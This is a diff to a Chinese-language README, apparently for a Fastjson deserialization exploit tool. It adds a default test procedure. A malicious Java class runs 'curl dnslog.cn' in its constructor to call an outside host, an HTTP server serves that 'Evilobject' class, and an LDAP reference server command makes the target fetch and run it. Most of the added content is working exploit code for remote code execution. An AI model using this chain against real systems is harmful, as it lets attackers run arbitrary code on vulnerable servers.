@@ -48,9 +48,41 @@ else:
 
 有些环境可能利用不成功，可以尝试默认的测试方法,
 例如：
-生成测试的class文件，启动http服务器
+生成测试的class文件，
+import java.lang.Runtime;
+import java.lang.Process;
+
+public class Object {
+    public Object() throws Exception {
+        Runtime.getRuntime().exec("curl dnslog.cn");
+   }
+}
+启动http服务器
+import java.io.*;
+import java.net.*;
+import com.sun.net.httpserver.*;
+
+public class RMIService {
+    public static void main(String[] args) {
+        try {
+            String serverAddress = args[0];
+            int localport = Integer.parseInt(args[1]);
+            System.out.println("Starting HTTP server");
+            HttpServer httpServer = HttpServer.create(new InetSocketAddress(localport), 0);
+            httpServer.createContext("/",new HttpFileHandler());
+            httpServer.setExecutor(null);
+            httpServer.start();
+            System.out.println("\nEvilobject: http://"+serverAddress+":"+localport+"/Object.class");
+
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
 启动ldap服务，从http服务获取class
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
+
+查询执行结果
 
 ```
 
